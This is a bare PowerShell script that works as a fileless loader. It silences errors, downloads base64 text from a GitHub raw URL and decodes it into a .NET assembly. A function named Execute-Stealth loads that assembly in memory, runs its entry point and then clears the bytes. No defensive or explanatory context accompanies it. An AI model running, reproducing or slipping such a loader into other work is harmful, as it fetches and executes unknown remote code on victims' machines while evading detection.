$ErrorActionPreference = "SilentlyContinue"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ProgressPreference = 'SilentlyContinue'

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)

    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @()) | Out-Null
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    if ($bytes -ne $null) {
        [Array]::Clear($bytes, 0, $bytes.Length)
    }
}

$url = "https://raw.githubusercontent.com/thegoatofapi/myl/refs/heads/main/file.txt"

Execute-Stealth -url $url